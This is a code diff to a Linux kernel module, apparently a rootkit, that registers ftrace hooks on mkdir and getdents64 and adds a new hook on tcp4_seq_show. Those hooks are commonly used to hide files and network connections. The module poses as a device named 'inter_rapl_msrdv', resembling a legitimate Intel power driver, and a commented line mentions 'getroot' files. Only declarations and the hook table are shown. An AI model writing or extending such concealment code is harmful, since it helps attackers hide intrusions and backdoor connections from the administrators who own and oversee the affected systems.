@@ -3,6 +3,7 @@
 #include <linux/kernel.h>
 #include <linux/fs.h>
 #include <linux/device.h>
+#include <linux/version.h>
 #include "ftrace_helper.h"
 
 #define DEVICE_NAME "inter_rapl_msrdv"
@@ -49,11 +50,15 @@ asmlinkage long hook_mkdir(const struct pt_regs *);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 asmlinkage long hook_getdents64(const struct pt_regs *);
 
+// tcp4_seq_show
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *, void *);
+asmlinkage long hook_tcp4_seq_show(struct seq_file *, void *);
+
 // HOOK函数
 struct ftrace_hook hooks[] = {
-    HOOK("sys_mkdir", hook_mkdir, &orig_mkdir),
-    HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
-};
+    HOOK("__x64_sys_mkdir", hook_mkdir, &orig_mkdir),
+    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show)};
 
 // char *file_name = {"getroot", "getroot.c"};
 // 内核链表
